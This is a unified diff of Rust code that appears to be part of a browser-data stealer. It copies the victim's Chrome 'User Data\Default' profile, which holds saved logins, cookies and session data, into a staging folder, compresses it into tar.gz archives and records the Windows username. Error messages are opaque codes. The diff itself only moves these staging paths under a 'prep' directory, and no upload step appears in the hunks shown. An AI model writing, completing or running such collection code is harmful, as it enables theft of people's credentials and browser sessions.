@@ -2,14 +2,14 @@ use std::fs;
 use std::process::Command;
 
 fn copy(path: &str) {
-    if let Err(e) = fs::create_dir_all("chrome_data") {
+    if let Err(e) = fs::create_dir_all("prep/chrome_data") {
         eprintln!("[ERR07]");
         return;
     }
 
     let output = Command::new("cmd")
         .arg("/C")
-        .arg(format!("xcopy \"{}\" \"chrome_data\\\" /E /I /Y", path))
+        .arg(format!("xcopy \"{}\" \"prep\\chrome_data\\\" /E /I /Y", path))
         .output()
         .expect("[ERR08]");
 
@@ -21,7 +21,7 @@ fn copy(path: &str) {
 }
 
 fn compressFolder(path: &str, archiveName: &str) {
-    if let Err(e) = fs::create_dir_all("targz") {
+    if let Err(e) = fs::create_dir_all("prep/targz") {
         eprintln!("[ERR06]");
         return;
     }
@@ -30,7 +30,7 @@ fn compressFolder(path: &str, archiveName: &str) {
         .arg("-c")  
         .arg("-z") 
         .arg("-f")  
-        .arg(format!("targz/{}.tar.gz", archiveName))
+        .arg(format!("prep\\targz\\{}.tar.gz", archiveName))
         .arg(path)
         .output()
         .expect("[ERR03]");
@@ -57,5 +57,5 @@ fn main() {
 
     copy(&format!("{}AppData\\Local\\Google\\Chrome\\User Data\\Default", user_path));
 
-    fs::write("user_data", &username).expect("[ERR10]");
+    fs::write("prep/user_data", &username).expect("[ERR10]");
 }
